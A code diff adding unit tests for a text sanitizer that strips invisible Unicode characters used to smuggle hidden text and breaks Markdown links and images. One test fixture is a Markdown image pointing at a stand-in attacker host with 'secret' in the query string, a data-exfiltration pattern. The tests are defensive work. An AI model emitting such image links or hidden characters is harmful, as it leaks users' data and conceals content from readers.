@@ -47,3 +47,15 @@ describe('consent page', () => {
     expect(csp).not.toContain('script-src');
   });
 });
+
+describe('plainText smuggling and links', () => {
+  it('removes supplementary variation selectors and the combining grapheme joiner', () => {
+    const hidden = Array.from({ length: 15 }, (_, i) => String.fromCodePoint(0xe0100 + i)).join('');
+    expect(plainText(`ok${hidden}͏!`, 100)).toBe('ok!');
+  });
+  it('breaks Markdown images and links so a renderer will not fetch them', () => {
+    const out = plainText('nice ![x](https://evil.test/?d=secret) and [click](https://evil.test)', 200);
+    expect(out).not.toMatch(/\]\(/);
+    expect(out).not.toContain('![');
+  });
+});
